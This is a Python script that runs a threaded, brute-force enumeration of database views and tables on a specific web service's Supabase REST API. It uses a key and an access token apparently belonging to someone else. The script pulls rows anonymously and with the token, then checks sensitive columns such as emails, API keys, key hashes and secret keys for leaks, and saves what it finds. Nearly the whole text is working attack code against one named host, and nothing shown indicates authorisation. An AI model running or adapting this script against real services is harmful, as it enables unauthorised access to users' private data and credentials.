#!/usr/bin/env python3
# P3 (threaded): SECURITY-DEFINER view hunt — enumerate view-shaped relations, then check for RLS-bypassing rows.
# Read-only. Oracle: GET /rest/v1/<name>?select=*&limit=0 -> 200 means relation exists (table/view/matview).
import json, re, sys, time, threading
from concurrent.futures import ThreadPoolExecutor, as_completed
sys.stdout.reconfigure(encoding="utf-8")
from fast_client import FastHTTP

PK = "<publishable-key>"
TA = json.load(open("their_token.txt"))["access_token"]
KNOWN = {"profiles", "jobs", "admin_api_keys", "messages", "conversations"}
WORKERS = 3
t0 = time.time()
existing = []
lock = threading.Lock()
probed = 0

def worker_get(name):
    C = FastHTTP("cdn.onlyfakeai.ru", PK)
    st, txt, hd = C.request("GET", f"/rest/v1/{name}?select=*&limit=0")
    time.sleep(0.45)
    return name, st, txt, hd

prefixes = ["v_", "vw_", "view_", "public_", "admin_", "ops_", "analytics_", "dashboard_", "stats_",
            "job_", "jobs_", "profile_", "profiles_", "user_", "users_", "credit_", "payment_", "admin_panel_"]
suffixes = ["_view", "_views", "_stats", "_summary", "_data", "_details", "_with_email", "_full", "_public",
            "_admin", "_activity", "_log", "_logs", "_history", "_report", "_metrics", "_counts", "_overview"]
bases = """profiles jobs users admin_users admins admin admin_activity admin_credits admin_payments admin_plans
credits payments payment_assignments plans api_keys admin_api_keys messages conversations tickets support flags bans
sessions tokens analytics dashboard leaderboard stats usage quota exports backups transactions wallets balances
orders invoices referrals coupons products templates documents photos storage_objects auth_users email_logs
worker_status queue job_status jobs_queue jobs_archive profiles_backup jobs_backup payments_log credits_log
admin_logs admin_audit admin_actions user_activity job_activity profile_stats job_stats generated_documents
watermark_jobs no_watermark_jobs telegram_users telegram_sessions site_settings app_settings secrets""".split()
bases = bases[:50]
names = set()
for p in prefixes:
    names.add(p.rstrip("_"))
    for b in bases:
        names.add(f"{p}{b}")
for b in bases:
    for s in suffixes:
        names.add(f"{b}{s}")
names.update("""admin_activity admin_activity_log admin_credit_leaderboard admin_profiles admin_jobs admin_stats
admin_summary admin_dashboard admin_metrics admin_counts admin_api_keys_view admin_users_view admin_activity_view
admin_profiles_view admin_jobs_view admin_leaderboard admin_payment_stats admin_credit_stats admin_credit_history
admin_audit_log admin_action_log admin_panel analytics_summary analytics_admin_activity analytics_stats
analytics_dashboard dashboard_stats dashboard_metrics dashboard_summary job_stats jobs_stats job_stats_view
jobs_stats_view job_status_view job_history_view profile_stats profile_stats_view profiles_stats profiles_stats_view
profiles_public public_profiles public_jobs user_directory user_stats users_view flagged_users banned_users
credit_leaderboard credits_leaderboard credit_transactions_view payment_assignments_view payments_view
payment_history_view transaction_history transaction_log wallet_transactions ledger_view accounting_view
job_queue_view queue_view worker_status_view worker_stats_view sales_stats revenue_stats income_stats
signup_stats profit_stats payment_stats document_stats country_stats template_stats product_stats
telegram_users_view messages_view conversations_view support_tickets_view tickets_view audit_log_view
admin_dashboard_view ops_profiles ops_jobs ops_users ops_dashboard""".split())
names = sorted(n for n in names if n)
print(f"P3 candidate view names: {len(names)}", flush=True)

with ThreadPoolExecutor(max_workers=WORKERS) as ex:
    futs = {ex.submit(worker_get, n): n for n in names}
    for i, fu in enumerate(as_completed(futs)):
        name, st, body, hd = fu.result()
        with lock:
            probed += 1
        if st == 200:
            existing.append(name)
            print(f"[REL] {name} -> 200", flush=True)
        elif st not in (404,):
            print(f"[?] {name} -> {st} {body[:120]}", flush=True)
        if i % 150 == 0:
            print(f"... {i}/{len(names)} existing={len(existing)} rate={i/(time.time()-t0+0.001):.1f}/s "
                  f"elapsed={time.time()-t0:.0f}s", flush=True)

existing = sorted(existing)
print(f"\nEXISTING RELATIONS ({len(existing)}): {existing}", flush=True)
new_relations = [n for n in existing if n not in KNOWN]

C = FastHTTP("cdn.onlyfakeai.ru", PK)
rows = {}
def get1(path, token=None):
    h = {"Authorization": "Bearer " + token} if token else {}
    st, txt, hd = C.request("GET", path, headers=h)
    time.sleep(0.4)
    return st, txt, hd

for n in existing:
    for tok, lab in ((None, "anon"), (TA, "auth")):
        st, body, hd = get1(f"/rest/v1/{n}?select=*&limit=5", tok)
        print(f"\n[{n}][{lab}] {st} cr={hd.get('Content-Range')} :: {body[:700]}", flush=True)
        rows[f"{n}:{lab}"] = {"status": st, "body": body[:2000], "content_range": hd.get("Content-Range")}

for n in new_relations:
    for col in ["email", "role", "user_id", "admin_email", "api_key", "key_hash", "generations_left", "activePlan", "secret_key"]:
        st, body, hd = get1(f"/rest/v1/{n}?select={col}&limit=2")
        if st == 200 and body.strip() != "[]":
            print(f"[COL-LEAK] {n}.{col} anon -> {body[:300]}", flush=True)
            rows[f"col:{n}.{col}"] = body[:500]

json.dump({"probed": probed, "elapsed": round(time.time()-t0,1), "existing": existing,
           "new_relations": new_relations, "rows": rows}, open("probe_p3_results.json","w"), indent=1)
print(f"\nDONE requests={probed} elapsed={time.time()-t0:.0f}s existing={existing} new={new_relations}")
